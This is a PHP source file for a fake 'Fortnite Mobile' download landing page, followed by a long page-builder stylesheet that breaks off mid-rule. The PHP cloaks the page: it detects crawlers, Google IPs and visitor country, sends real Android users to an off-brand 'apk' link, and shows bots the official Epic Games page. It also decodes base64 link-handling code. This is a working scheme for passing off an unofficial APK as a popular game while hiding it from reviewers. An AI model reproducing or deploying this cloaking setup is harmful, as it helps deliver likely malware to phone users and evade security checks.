<?php

require_once 'vendor/autoload.php';
require_once 'helpers.php';

use Jaybizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect();

$ua = $_SERVER['HTTP_USER_AGENT'];
$CrawlerDetect->setUserAgent($ua);

$ua = strtolower($_SERVER['HTTP_USER_AGENT']) ?? false;

$linkNormal = 'http://middleeu.tubehatee.com/?id=6&country=eu'; //link apk
$linkForBot = 'https://www.epicgames.com/fortnite/en-US/mobile/android/get-started'; //link store
$apiGetIP = 'https://onesignal.modobomco.com/ip';
$countryLP = ''; //MY || TH || RS || MK || SK || GR

//$countryLP = 'VN'; //TH || MY || VN


try {
    $txt = trim(file_get_contents('link_download.txt'));
    if (!empty($txt)) {
        $link = $txt;
    }
} catch (\Exception $ex) {


}


if (empty($link)) {
    $link = $linkForBot;
}


$target = '_self';



$isBot = 1;
$isRedirect = 0; //1 if you wanna redirect link


$ip = $_SERVER['REMOTE_ADDR'];

$ipInfo = getIpInfo($ip);

// Check the user agent of the current 'visitor'
if (
    !$CrawlerDetect->isCrawler() &&
    ($ua && strpos($ua, 'android') !== false) &&
    !isIpGoogle($ipInfo) &&
    isCountryValid($ipInfo)

) {
    $isBot = 0;
    
}

if ($isBot == 1) {
    $link = $linkForBot;
}


$codeHandleLinkApk = base64_decode(getCodeHandleLinkApk($isBot, $link));

$fullCodeHeader = getAnalyticFullCode()."\n".getAdsIdFullCode()."\n"
    .getAdsConversionFullCode()."\n".getTagManagerFullHeadCode()."\n";


//echo $fullCodeHeader; after <head> tag
//echo getTagManagerFullBodyCode(); after <body> tag   


?>

<!DOCTYPE html>
<html lang = 'en'>

<head>
	<meta charset="UTF-8">
	<title>Fortnite Mobile - SEASON 5</title>
	<meta http-equiv="Cache-Control" content="no-cache">
	<meta http-equiv="Expires" content="-1">
	<meta name="keywords" content="Fortnite, Fortnite Mobile, Fortnite apk, Fortnite Android, Download Fortnite, Install Fortnite, Fortnite Free, Fortnite 2021, Fortnite APK full version">
	<meta name="description" content="Fornite: Chepter 2 - Season 5 . The zero point has been unearthed and the island is in chaos. Eplore the new desert landscape with locaitions new and familar as you battle to stop others from escaping the loop. Free download fortnite for android.">
	
	<link rel="canonical" href="http://preview.pagedemo.me/6004fdc01cba2c00118c7b18" />
	<meta property="og:url" content="http://preview.pagedemo.me/6004fdc01cba2c00118c7b18" />
	<meta property="og:title" content="Fortnite Mobile - SEASON 5" />
	<meta property="og:type" content="website" />
	<meta property="og:image" content="https://static.ladipage.net/58fce0433a617d2d7d843a28/logo-2-20200904043126.jpg">
	<meta property="og:description" content="Fornite: Chepter 2 - Season 5 . The zero point has been unearthed and the island is in chaos. Eplore the new desert landscape with locaitions new and familar as you battle to stop others from escaping the loop. Free download fortnite for android." />
	<meta name="format-detection" content="telephone=no" />
	<link rel="shortcut icon" type="image/png" href="https://static.ladipage.net/58fce0433a617d2d7d843a28/logo-2-20200904043126.jpg" />
	<link rel="dns-prefetch">
	<link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin>
	<link rel="preconnect" href="https://w.ladicdn.com/" crossorigin>
	<link rel="preconnect" href="https://s.ladicdn.com/" crossorigin>
	<link rel="preconnect" href="https://api.form.ladipage.com/" crossorigin>
	<link rel="preconnect" href="https://a.ladipage.com/" crossorigin>
	<link rel="preconnect" href="https://api.ladisales.com/" crossorigin>
	<link rel="preload" href="https://fonts.googleapis.com/css?family=Open Sans:bold,regular|Roboto:bold,regular|Sriracha:bold,regular|Paytone One:bold,regular|Bungee Inline:bold,regular&display=swap" as="style" onload="this.onload = null;this.rel = 'stylesheet';">
	<link rel="preload" href="https://w.ladicdn.com/v2/source/ladipage.vi.min.js?v=1612422913124" as="script">
	<style id="style_ladi" type="text/css">
		a,abbr,acronym,address,applet,article,aside,audio,b,big,blockquote,body,button,canvas,caption,center,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,input,ins,kbd,label,legend,li,mark,menu,nav,object,ol,output,p,pre,q,ruby,s,samp,section,select,small,span,strike,strong,sub,summary,sup,table,tbody,td,textarea,tfoot,th,thead,time,tr,tt,u,ul,var,video{margin:0;padding:0;border:0;outline:0;font-size:100%;font:inherit;vertical-align:baseline;box-sizing:border-box;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}a{text-decoration:none}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:after,blockquote:before,q:after,q:before{content:'';content:none}table{border-collapse:collapse;border-spacing:0}body{font-size:12px;-ms-text-size-adjust:none;-moz-text-size-adjust:none;-o-text-size-adjust:none;-webkit-text-size-adjust:none;background:#fff}.ladi-loading{width:80px;height:80px;z-index:900000000000;position:fixed;top:0;left:0;bottom:0;right:0;margin:auto;overflow:hidden}.ladi-loading div{position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;animation:ladi-loading 1.2s linear infinite}.ladi-loading div:nth-child(1){animation-delay:0s;top:37px;left:66px}.ladi-loading div:nth-child(2){animation-delay:-.1s;top:22px;left:62px}.ladi-loading div:nth-child(3){animation-delay:-.2s;top:11px;left:52px}.ladi-loading div:nth-child(4){animation-delay:-.3s;top:7px;left:37px}.ladi-loading div:nth-child(5){animation-delay:-.4s;top:11px;left:22px}.ladi-loading div:nth-child(6){animation-delay:-.5s;top:22px;left:11px}.ladi-loading div:nth-child(7){animation-delay:-.6s;top:37px;left:7px}.ladi-loading div:nth-child(8){animation-delay:-.7s;top:52px;left:11px}.ladi-loading div:nth-child(9){animation-delay:-.8s;top:62px;left:22px}.ladi-loading div:nth-child(10){animation-delay:-.9s;top:66px;left:37px}.ladi-loading div:nth-child(11){animation-delay:-1s;top:62px;left:52px}.ladi-loading div:nth-child(12){animation-delay:-1.1s;top:52px;left:62px}@keyframes ladi-loading{0%,100%,20%,80%{transform:scale(1)}50%{transform:scale(1.5)}}.overflow-hidden{overflow:hidden}.ladi-transition{transition:all 150ms linear 0s}.opacity-0{opacity:0}.pointer-events-none{pointer-events:none}.ladipage-message{position:fixed;width:100%;height:100%;top:0;left:0;z-index:1000000000;background:rgba(0,0,0,.3)}.ladipage-message .ladipage-message-box{width:400px;max-width:calc(100% - 50px);height:160px;border:1px solid rgba(0,0,0,.3);background-color:#fff;position:fixed;top:calc(50% - 155px);left:0;right:0;margin:auto;border-radius:10px}.ladipage-message .ladipage-message-box h1{background-color:rgba(6,21,40,.05);color:#000;padding:12px 15px;font-weight:600;font-size:16px;border-top-left-radius:10px;border-top-right-radius:10px}.ladipage-message .ladipage-message-box .ladipage-message-text{font-size:14px;padding:0 20px;margin-top:10px;line-height:18px;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden;text-overflow:ellipsis;display:-webkit-box}.ladipage-message .ladipage-message-box .ladipage-message-close{display:block;position:absolute;right:15px;bottom:10px;margin:0 auto;padding:10px 0;border:none;width:80px;text-transform:uppercase;text-align:center;color:#000;background-color:#e6e6e6;border-radius:5px;text-decoration:none;font-size:14px;font-weight:600;cursor:pointer}.ladi-wraper{width:100%;height:100%;overflow:hidden;background:#fff}.ladi-section{margin:0 auto;position:relative}.ladi-section .ladi-section-arrow-down{position:absolute;width:36px;height:30px;bottom:0;right:0;left:0;margin:auto;background:url(https://w.ladicdn.com/v2/source/ladi-icons.svg) rgba(255,255,255,.2) no-repeat;background-position:4px;cursor:pointer;z-index:90000040}.ladi-section.ladi-section-readmore{transition:height 350ms linear 0s}.ladi-section .ladi-section-background{position:absolute;width:100%;height:100%;top:0;left:0;pointer-events:none;overflow:hidden}.ladi-container{position:relative;margin:0 auto;height:100%}.ladi-element{position:absolute}.ladi-overlay{position:absolute;top:0;left:0;height:100%;width:100%;pointer-events:none}.ladi-carousel{position:absolute;width:100%;height:100%;overflow:hidden}.ladi-carousel .ladi-carousel-content{position:absolute;width:100%;height:100%;left:0;transition:left 350ms ease-in-out}.ladi-carousel .ladi-carousel-arrow{position:absolute;width:30px;height:36px;top:calc(50% - 18px);background:url(https://w.ladicdn.com/v2/source/ladi-icons.svg) rgba(255,255,255,.2) no-repeat;cursor:pointer;z-index:90000040}.ladi-carousel .ladi-carousel-arrow-left{left:5px;background-position:-28px}.ladi-carousel .ladi-carousel-arrow-right{right:5px;background-position:-52px}.ladi-gallery{position:absolute;width:100%;height:100%}.ladi-gallery .ladi-gallery-view{position:absolute;overflow:hidden}.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item{background-size:cover;background-repeat:no-repeat;background-position:center center;width:100%;height:100%;position:relative;display:none;transition:transform .5s ease-in-out;-webkit-backface-visibility:hidden;backface-visibility:hidden;-webkit-perspective:1000px;perspective:1000px}.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.play-video{cursor:pointer}.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.play-video:after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:60px;height:60px;background:url(https://w.ladicdn.com/source/ladipage-play.svg) no-repeat center center;background-size:contain;pointer-events:none;cursor:pointer}.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.next,.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.selected.right{left:0;transform:translate3d(100%,0,0)}.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.prev,.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.selected.left{left:0;transform:translate3d(-100%,0,0)}.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.next.left,.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.prev.right,.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item.selected{left:0;transform:translate3d(0,0,0)}.ladi-gallery .ladi-gallery-view>.next,.ladi-gallery .ladi-gallery-view>.prev,.ladi-gallery .ladi-gallery-view>.selected{display:block}.ladi-gallery .ladi-gallery-view>.selected{left:0}.ladi-gallery .ladi-gallery-view>.next,.ladi-gallery .ladi-gallery-view>.prev{position:absolute;top:0;width:100%}.ladi-gallery .ladi-gallery-view>.next{left:100%}.ladi-gallery .ladi-gallery-view>.prev{left:-100%}.ladi-gallery .ladi-gallery-view>.next.left,.ladi-gallery .ladi-gallery-view>.prev.right{left:0}.ladi-gallery .ladi-gallery-view>.selected.left{left:-100%}.ladi-gallery .ladi-gallery-view>.selected.right{left:100%}.ladi-gallery .ladi-gallery-control{position:absolute;overflow:hidden}.ladi-gallery.ladi-gallery-top .ladi-gallery-view{width:100%}.ladi-gallery.ladi-gallery-top .ladi-gallery-control{top:0;width:100%}.ladi-gallery.ladi-gallery-bottom .ladi-gallery-view{top:0;width:100%}.ladi-gallery.ladi-gallery-bottom .ladi-gallery-control{width:100%;bottom:0}.ladi-gallery.ladi-gallery-left .ladi-gallery-view{height:100%}.ladi-gallery.ladi-gallery-left .ladi-gallery-control{height:100%}.ladi-gallery.ladi-gallery-right .ladi-gallery-view{height:100%}.ladi-gallery.ladi-gallery-right .ladi-gallery-control{height:100%;right:0}.ladi-gallery .ladi-gallery-view .ladi-gallery-view-arrow{position:absolute;width:30px;height:36px;top:calc(50% - 18px);background:url(https://w.ladicdn.com/v2/source/ladi-icons.svg) rgba(255,255,255,.2) no-repeat;cursor:pointer;z-index:90000040}.ladi-gallery .ladi-gallery-view .ladi-gallery-view-arrow-left{left:5px;background-position:-28px}.ladi-gallery .ladi-gallery-view .ladi-gallery-view-arrow-right{right:5px;background-position:-52px}.ladi-gallery .ladi-gallery-control .ladi-gallery-control-arrow{position:absolute;background:url(https://w.ladicdn.com/v2/source/ladi-icons.svg) rgba(255,255,255,.2) no-repeat;cursor:pointer;z-index:90000040}.ladi-gallery.ladi-gallery-bottom .ladi-gallery-control .ladi-gallery-control-arrow,.ladi-gallery.ladi-gallery-top .ladi-gallery-control .ladi-gallery-control-arrow{top:calc(50% - 18px);width:30px;height:36px}.ladi-gallery.ladi-gallery-top .ladi-gallery-control .ladi-gallery-control-arrow-left{left:0;background-position:-28px;transform:scale(.6)}.ladi-gallery.ladi-gallery-top .ladi-gallery-control .ladi-gallery-control-arrow-right{right:0;background-position:-52px;transform:scale(.6)}.ladi-gallery.ladi-gallery-bottom .ladi-gallery-control .ladi-gallery-control-arrow-left{left:0;background-position:-28px;transform:scale(.6)}.ladi-gallery.ladi-gallery-bottom .ladi-gallery-control .ladi-gallery-control-arrow-right{right:0;background-position:-52px;transform:scale(.6)}.ladi-gallery.ladi-gallery-left .ladi-gallery-control .ladi-gallery-control-arrow,.ladi-gallery.ladi-gallery-right .ladi-gallery-control .ladi-gallery-control-arrow{left:calc(50% - 18px);width:36px;height:30px}.ladi-gallery.ladi-gallery-left .ladi-gallery-control .ladi-gallery-control-arrow-left{top:0;background-position:-77px;transform:scale(.6)}.ladi-gallery.ladi-gallery-left .ladi-gallery-control .ladi-gallery-control-arrow-right{bottom:0;background-position:3px;transform:scale(.6)}.ladi-gallery.ladi-gallery-right .ladi-gallery-control .ladi-gallery-control-arrow-left{top:0;background-position:-77px;transform:scale(.6)}.ladi-gallery.ladi-gallery-right .ladi-gallery-control .ladi-gallery-control-arrow-right{bottom:0;background-position:3px;transform:scale(.6)}.ladi-gallery .ladi-gallery-control .ladi-gallery-control-box{position:relative}.ladi-gallery.ladi-gallery-top .ladi-gallery-control .ladi-gallery-control-box{display:inline-flex;left:0;transition:left 150ms ease-in-out}.ladi-gallery.ladi-gallery-bottom .ladi-gallery-control .ladi-gallery-control-box{display:inline-flex;left:0;transition:left 150ms ease-in-out}.ladi-gallery.ladi-gallery-left .ladi-gallery-control .ladi-gallery-control-box{display:inline-grid;top:0;transition:top 150ms ease-in-out}.ladi-gallery.ladi-gallery-right .ladi-gallery-control .ladi-gallery-control-box{display:inline-grid;top:0;transition:top 150ms ease-in-out}.ladi-gallery .ladi-gallery-control .ladi-gallery-control-box .ladi-gallery-control-item{background-size:cover;background-repeat:no-repeat;background-position:center center;float:left;position:relative;cursor:pointer;filter:invert(15%)}.ladi-gallery .ladi-gallery-control .ladi-gallery-control-box .ladi-gallery-control-item.play-video:after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:30px;height:30px;background:url(https://w.ladicdn.com/source/ladipage-play.svg) no-repeat center center;background-size:contain;pointer-events:none;cursor:pointer}.ladi-gallery .ladi-gallery-control .ladi-gallery-control-box .ladi-gallery-control-item:hover{filter:none}.ladi-gallery .ladi-gallery-control .ladi-gallery-control-box .ladi-gallery-control-item.selected{filter:none}.ladi-gallery .ladi-gallery-control .ladi-gallery-control-box .ladi-gallery-control-item:last-child{margin-right:0!important;margin-bottom:0!important}.ladi-table{position:absolute;width:100%;height:100%;overflow:auto}.ladi-table table{width:100%}.ladi-table table td{vertical-align:middle}.ladi-table tbody td{word-break:break-word}.ladi-table table td img{cursor:pointer;width:100%}.ladi-box{position:absolute;width:100%;height:100%;overflow:hidden}.ladi-frame{position:absolute;width:100%;height:100%;overflow:hidden}.ladi-frame .ladi-frame-background{height:100%;width:100%;pointer-events:none}.ladi-banner{position:absolute;width:100%;height:100%;overflow:hidden}.ladi-banner .ladi-banner-background{height:100%;width:100%;pointer-events:none}#SECTION_POPUP .ladi-container{z-index:90000070}#SECTION_POPUP .ladi-container>.ladi-element{z-index:90000070;position:fixed;display:none}#SECTION_POPUP .ladi-container>.ladi-element.hide-visibility{display:block!important;visibility:hidden!important}#SECTION_POPUP .popup-close{width:30px;height:30px;position:absolute;right:0;top:0;transform:scale(.8);-webkit-transform:scale(.8);z-index:9000000080;background:url(https://w.ladicdn.com/v2/source/ladi-icons.svg) rgba(255,255,255,.2) no-repeat;background-position:-108px;cursor:pointer;display:none}.ladi-popup{position:absolute;width:100%;height:100%}.ladi-popup .ladi-popup-background{height:100%;width:100%;pointer-events:none}.ladi-countdown{position:absolute;width:100%;height:100%}.ladi-countdown .ladi-countdown-background{position:absolute;width:100%;height:100%;top:0;left:0;background-size:inherit;background-attachment:inherit;background-origin:inherit;display:table;pointer-events:none}.ladi-countdown .ladi-countdown-text{position:absolute;width:100%;height:100%;text-decoration:inherit;display:table;pointer-events:none}.ladi-countdown .ladi-countdown-text span{display:table-cell;vertical-align:middle}.ladi-countdown>.ladi-element{text-decoration:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit;position:relative;display:inline-block}.ladi-countdown>.ladi-element:last-child{margin-right:0!important}.ladi-button{position:absolute;width:100%;height:100%;overflow:hidden}.ladi-button:active{transform:translateY(2px);transition:transform .2s linear}.ladi-button .ladi-button-background{height:100%;width:100%;pointer-events:none}.ladi-button>.ladi-element{width:100%!important;height:100%!important;top:0!important;left:0!important;display:table;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}.ladi-button>.ladi-element .ladi-headline{display:table-cell;vertical-align:middle}.ladi-collection{position:absolute;width:100%;height:100%}.ladi-collection.carousel{overflow:hidden}.ladi-collection .ladi-collection-content{position:absolute;width:100%;height:100%;left:0;transition:left 350ms ease-in-out}.ladi-collection .ladi-collection-content .ladi-collection-item{display:block;position:relative;float:left;box-shadow:0 0 0 1px #fff}.ladi-collection .ladi-collection-content .ladi-collection-page{float:left}.ladi-collection .ladi-collection-arrow{position:absolute;width:30px;height:36px;top:calc(50% - 18px);background:url(https://w.ladicdn.com/v2/source/ladi-icons.svg) rgba(255,255,255,.2) no-repeat;cursor:pointer;z-index:90000040}.ladi-collection .ladi-collection-arrow-left{left:5px;background-position:-28px}.ladi-collection .ladi-collection-arrow-right{right:5px;background-position:-52px}.ladi-collection .ladi-collection-button-next{position:absolute;width:36px;height:30px;bottom:-40px;right:0;left:0;margin:auto;background:url(https://w.ladicdn.com/v2/source/ladi-icons.svg) rgba(255,255,255,.2) no-repeat;background-position:4px;cursor:pointer;z-index:90000040}.ladi-form{position:absolute;width:100%;height:100%}.ladi-form>.ladi-element{text-transform:inherit;text-decoration:inherit;text-align:inherit;letter-spacing:inherit;color:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit}.ladi-form .ladi-button>.ladi-element{color:initial;font-size:initial;font-weight:initial;text-transform:initial;text-decoration:initial;font-style:initial;text-align:initial;letter-spacing:initial;line-height:initial}.ladi-form>.ladi-element .ladi-form-item-container{text-transform:inherit;text-decoration:inherit;text-align:inherit;letter-spacing:inherit;color:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item{text-transform:inherit;text-decoration:inherit;text-align:inherit;letter-spacing:inherit;color:inherit}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item-background{background-size:inherit;background-attachment:inherit;background-origin:inherit}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-control-select{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-size:9px 6px!important;background-position:right .5rem center;background-repeat:no-repeat}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-control-select-3{width:calc(100% / 3 - 5px);max-width:calc(100% / 3 - 5px);min-width:calc(100% / 3 - 5px)}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-control-select-3:nth-child(3){margin-left:7.5px}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-control-select-3:nth-child(4){margin-left:7.5px}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-control-select option{color:initial}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-control:not(.ladi-form-control-select){text-transform:inherit;text-decoration:inherit;text-align:inherit;letter-spacing:inherit;color:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-control-select:not([data-selected=""]){text-transform:inherit;text-decoration:inherit;text-align:inherit;letter-spacing:inherit;color:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-control-select[data-selected=""]{text-transform:inherit;text-align:inherit;letter-spacing:inherit;color:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-checkbox-item{text-transform:inherit;text-decoration:inherit;text-align:inherit;letter-spacing:inherit;color:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit;vertical-align:middle}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-checkbox-item span{user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-checkbox-item span[data-checked=true]{text-transform:inherit;text-decoration:inherit;text-align:inherit;letter-spacing:inherit;color:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit}.ladi-form>.ladi-element .ladi-form-item-container .ladi-form-item .ladi-form-checkbox-item span[data-checked=false]{text-transform:inherit;text-align:inherit;letter-spacing:inherit;color:inherit;background-size:inherit;background-attachment:inherit;background-origin:inherit}.ladi-form .ladi-form-item-container{position:absolute;width:100%;height:100%}.ladi-form .ladi-form-item{width:100%;height:100%;position:absolute}.ladi-form .ladi-form-item-background{position:absolute;width:100%;height:100%;top:0;left:0;pointer-events:none}.ladi-form .ladi-form-item.ladi-form-checkbox{height:auto}.ladi-form .ladi-form-item .ladi-form-control{background-color:transparent;min-width:100%;min-height:100%;max-width:100%;max-height:100%;width:100%;height:100%;padding:0 5px;color:inherit;font-size:inherit;border:none}.ladi-form .ladi-form-item.ladi-form-checkbox{padding:10px 5px}.ladi-form .ladi-form-item.ladi-form-checkbox.ladi-form-checkbox-vertical .ladi-form-checkbox-item{margin-top:0!important;margin-left:0!important;margin-right:0!important;display:table;border:none}.ladi-form .ladi-form-item.ladi-form-checkbox.ladi-form-checkbox-horizontal .ladi-form-checkbox-item{margin-top:0!important;margin-left:0!important;margin-right:10px!important;display:inline-block;border:none;position:relative}.ladi-form .ladi-form-item.ladi-form-checkbox .ladi-form-checkbox-item input{vertical-align:middle;width:13px;height:13px;display:table-cell;margin-right:5px}.ladi-form .ladi-form-item.ladi-form-checkbox .ladi-form-checkbox-item span{display:table-cell;cursor:default;vertical-align:middle;word-break:break-word}.ladi-form .ladi-form-item.ladi-form-checkbox.ladi-form-checkbox-horizontal .ladi-form-checkbox-item input{position:absolute;top:4px}.ladi-form .ladi-form-item.ladi-form-checkbox.ladi-form-checkbox-horizontal .ladi-form-checkbox-item span{padding-left:18px}.ladi-form .ladi-form-item textarea.ladi-form-control{resize:none;padding:5px}.ladi-form .ladi-button{cursor:pointer}.ladi-form .ladi-button .ladi-headline{cursor:pointer;user-select:none}.ladi-cart{position:absolute;width:100%;font-size:12px}.ladi-cart .ladi-cart-row{position:relative;display:inline-table;width:100%}.ladi-cart .ladi-cart-row:after{content:'';position:absolute;left:0;bottom:0;height:1px;width:100%;background:#dcdcdc}.ladi-cart .ladi-cart-no-product{text-align:center;font-size:16px;vertical-align:middle}.ladi-cart .ladi-cart-image{width:16%;vertical-align:middle;position:relative;text-align:center}.ladi-cart .ladi-cart-image img{max-width:100%}.ladi-cart .ladi-cart-title{vertical-align:middle;padding:0 5px;word-break:break-all}.ladi-cart .ladi-cart-title .ladi-cart-title-name{display:block;margin-bottom:5px}.ladi-cart .ladi-cart-title .ladi-cart-title-variant{font-weight:700;display:block}.ladi-cart .ladi-cart-image .ladi-cart-image-quantity{position:absolute;top:-3px;right:-5px;background:rgba(150,149,149,.9);width:20px;height:20px;border-radius:50%;text-align:center;color:#fff;line-height:20px}.ladi-cart .ladi-cart-quantity{width:70px;vertical-align:middle;text-align:center}.ladi-cart .ladi-cart-quantity-content{display:inline-flex}.ladi-cart .ladi-cart-quantity input{width:24px;text-align:center;height:22px;-moz-appearance:textfield;border-top:1px solid #dcdcdc;border-bottom:1px solid #dcdcdc}.ladi-cart .ladi-cart-quantity input::-webkit-inner-spin-button,.ladi-cart .ladi-cart-quantity input::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}.ladi-cart .ladi-cart-quantity button{border:1px solid #dcdcdc;cursor:pointer;text-align:center;width:21px;height:22px;position:relative;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}.ladi-cart .ladi-cart-quantity button:active{transform:translateY(2px);transition:transform .2s linear}.ladi-cart .ladi-cart-quantity button span{font-size:18px;position:relative;left:.5px}.ladi-cart .ladi-cart-quantity button:first-child span{top:-1.2px}.ladi-cart .ladi-cart-price{width:100px;vertical-align:middle;text-align:right;padding:0 5px}.ladi-cart .ladi-cart-action{width:28px;vertical-align:middle;text-align:center}.ladi-cart .ladi-cart-action button{border:1px solid #dcdcdc;cursor:pointer;text-align:center;width:25px;height:22px;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}.ladi-cart .ladi-cart-action button:active{transform:translateY(2px);transition:transform .2s linear}.ladi-cart .ladi-cart-action button span{font-size:13px;position:relative;top:.5px}.ladi-video{position:absolute;width:100%;height:100%;cursor:pointer;overflow:hidden}.ladi-video .ladi-video-background{position:absolute;width:100%;height:100%;top:0;left:0;pointer-events:none}.ladi-group{position:absolute;width:100%;height:100%}.ladi-button-group{position:absolute;width:100%;height:100%}.ladi-checkout{position:absolute;width:100%;height:100%}.ladi-shape{position:absolute;width:100%;height:100%;pointer-events:none}.ladi-html-code{position:absolute;width:100%;height:100%}.ladi-image{position:absolute;width:100%;height:100%;overflow:hidden;pointer-events:none}.ladi-image .ladi-image-background{background-repeat:no-repeat;background-position:left top;background-size:cover;background-attachment:scroll;background-origin:content-box;position:absolute;margin:0 auto;width:100%;height:100%;pointer-events:none}.ladi-headline{width:100%;display:inline-block;background-size:cover;background-position:center center}.ladi-headline a{text-decoration:underline}.ladi-paragraph{width:100%;display:inline-block}.ladi-paragraph a{text-decoration:underline}.ladi-list-paragraph{width:100%;display:inline-block}.ladi-list-paragraph a{text-decoration:underline}.ladi-list-paragraph ul li{position:relative;counter-increment:linum}.ladi-list-paragraph ul li:before{position:absolute;background-repeat:no-repeat;background-size:100% 100%;left:0}.ladi-list-paragraph ul li:last-child{padding-bottom:0!important}.ladi-line{position:relative}.ladi-line .ladi-line-container{border-bottom:0!important;border-right:0!important;width:100%;height:100%}a[data-action]{user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;cursor:pointer}a:visited{color:inherit}a:link{color:inherit}[data-opacity="0"]{opacity:0}[data-hidden=true]{display:none}[data-action=true]{cursor:pointer}.ladi-hidden{display:none}.backdrop-popup{display:none;position:fixed;top:0;left:0;right:0;bottom:0;z-index:90000060}.lightbox-screen{display:none;position:fixed;width:100%;height:100%;top:0;left:0;bottom:0;right:0;margin:auto;z-index:9000000080;background:rgba(0,0,0,.5)}.lightbox-screen .lightbox-close{width:30px;height:30px;position:absolute;z-index:9000000090;background:url(https://w.ladicdn.com/v2/source/ladi-icons.svg) rgba(255,255,255,.2) no-repeat;background-position:-108px;transform:scale(.7);-webkit-transform:scale(.7);cursor:pointer}.lightbox-screen .lightbox-hidden{display:none}.ladi-animation-hidden{visibility:hidden!important}.ladi-lazyload{background-image:none!important}.ladi-list-paragraph ul li.ladi-lazyload:before{background-image:none!important}.ladi-element.ladi-auto-scroll{overflow-x:scroll;overflow-y:hidden;width:100%!important;left:0!important;-webkit-overflow-scrolling:touch}.ladi-section.ladi-auto-scroll{overflow-x:scroll;overflow-y:hidden;-webkit-overflow-scrolling:touch}.ladi-carousel .ladi-carousel-content{transition:left .3s ease-in-out}.ladi-gallery .ladi-gallery-view>.ladi-gallery-view-item{transition:transform .3s ease-in-out}.ladi-notify-transition{transition:top .5s ease-in-out,bottom .5s ease-in-out,opacity .5s ease-in-out}.ladi-notify{padding:5px;box-shadow:0 0 1px rgba(64,64,64,.3),0 8px 50px rgba(64,64,64,.05);border-radius:40px;color:rgba(64,64,64,1);background:rgba(250,250,250,.9);line-height:1.6;width:100%;height:100%;font-size:13px}.ladi-notify .ladi-notify-image img{float:left;margin-right:13px;border-radius:50%;width:53px;height:53px;pointer-events:none}.ladi-notify .ladi-notify-title{font-size:100%;height:17px;overflow:hidden;font-weight:700;overflow-wrap:break-word;text-overflow:ellipsis;white-space:nowrap;line-height:1}.ladi-notify .ladi-notify-content{font-size:92.308%;height:17px;overflow:hidden;overflow-wrap:break-word;text-overflow:ellipsis;white-space:nowrap;line-height:1;padding-top:2px}.ladi-notify .ladi-notify-time{line-height:1.6;font-size:84.615%;display:inline-block;overflow-wrap:break-word;text-overflow:ellipsis;white-space:nowrap;max-width:calc(100% - 155px);overflow:hidden}.ladi-notify .ladi-notify-copyright{font-size:76.9231%;margin-left:2px;position:relative;padding:0 5px;cursor:pointer;opacity:.6;display:inline-block;top:-4px}.ladi-notify .ladi-notify-copyright svg{vertical-align:middle}.ladi-notify .ladi-notify-copyright svg:not(:root){overflow:hidden}.ladi-notify .ladi-notify-copyright div{text-decoration:none;color:rgba(64,64,64,1);display:inline}.ladi-notify .ladi-notify-copyright strong{font-weight:700}.builder-container .ladi-notify{transition:unset}.ladi-spin-lucky{width:100%;height:100%;border-radius:100%;box-shadow:0 0 7px 0 rgba(64,64,64,.6),0 8px 50px rgba(64,64,64,.3);background-repeat:no-repeat;background-size:cover}.ladi-spin-lucky .ladi-spin-lucky-start{position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:20%;height:20%;cursor:pointer;background-size:contain;background-position:center center;background-repeat:no-repeat;transition:transform .3s ease-in-out;-webkit-transition:transform .3s ease-in-out}.ladi-spin-lucky .ladi-spin-lucky-start:hover{transform:scale(1.1)}.ladi-spin-lucky .ladi-spin-lucky-screen{width:100%;height:100%;border-radius:100%;transition:transform 7s cubic-bezier(.25,.1,0,1);-webkit-transition:transform 7s 